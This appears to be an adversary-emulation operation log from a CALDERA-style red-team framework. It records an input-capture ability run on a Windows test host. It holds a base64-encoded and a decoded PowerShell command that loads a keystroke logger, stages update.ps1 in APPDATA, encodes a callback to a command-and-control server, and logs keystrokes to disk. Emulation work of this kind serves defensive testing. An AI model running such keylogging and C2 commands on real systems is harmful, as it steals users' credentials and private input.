@@ -1,0 +1,128 @@
+{
+    "adversary": {
+        "adversary_id": "f3a842ea-21a6-4aef-971b-8b45ea95742b",
+        "description": "u",
+        "id": 24,
+        "name": "input capture",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdbT1056",
+                    "adversary_map_id": 232,
+                    "cleanup": "",
+                    "description": "test",
+                    "executor": "psh",
+                    "id": 193,
+                    "name": "input capture",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 193,
+                            "payload": "Get-Keystrokes.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "credential-access",
+                    "technique_id": "T1056",
+                    "technique_name": "input capture",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEdldC1LZXlzdHJva2VzLnBzMSAtVmVyYm9zZSAtRm9yY2U7Ck1vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7CiRwY29kZSA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoIkltcG9ydC1Nb2R1bGUgJGVudjpBUFBEQVRBXHVwZGF0ZS5wczE7dXBkYXRlKCcje3NlcnZlcn0nKSIpKTsKR2V0LUtleXN0cm9rZXMucHMxIC1Mb2dQYXRoIGM6XGtleS5sb2c7"
+                },
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdbT1056",
+                    "adversary_map_id": 232,
+                    "cleanup": "",
+                    "description": "test",
+                    "executor": "pwsh",
+                    "id": 194,
+                    "name": "input capture",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 194,
+                            "payload": "Get-Keystrokes.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "credential-access",
+                    "technique_id": "T1056",
+                    "technique_name": "input capture",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEdldC1LZXlzdHJva2VzLnBzMSAtVmVyYm9zZSAtRm9yY2U7Ck1vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7CiRwY29kZSA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoIkltcG9ydC1Nb2R1bGUgJGVudjpBUFBEQVRBXHVwZGF0ZS5wczE7dXBkYXRlKCcje3NlcnZlcn0nKSIpKTsKR2V0LUtleXN0cm9rZXMucHMxIC1Mb2dQYXRoIGM6XGtleS5sb2c7"
+                }
+            ]
+        }
+    },
+    "facts": [],
+    "finish": "2019-10-29 09:32:14",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-29 09:32:12",
+            "last_trusted_seen": "2019-10-29 09:32:12",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 1692,
+            "platform": "windows",
+            "ppid": 3496,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "4/8",
+    "name": "input",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": []
+        }
+    ],
+    "start": "2019-10-29 09:31:47",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdbT1056",
+                    "attack": {
+                        "tactic": "credential-access",
+                        "technique_id": "T1056",
+                        "technique_name": "input capture"
+                    },
+                    "command": "Import-Module .\\Get-Keystrokes.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Import-Module $env:APPDATA\\update.ps1;update('http://10.203.202.154:8888')\"));Get-Keystrokes.ps1 -LogPath c:\\key.log;",
+                    "delegated": "2019-10-29 09:32:11.512583",
+                    "description": "test",
+                    "executor": "psh",
+                    "name": "input capture",
+                    "platform": "windows",
+                    "run": "2019-10-29 09:32:12",
+                    "status": 0
+                }
+            ]
+        }
+    }
+}
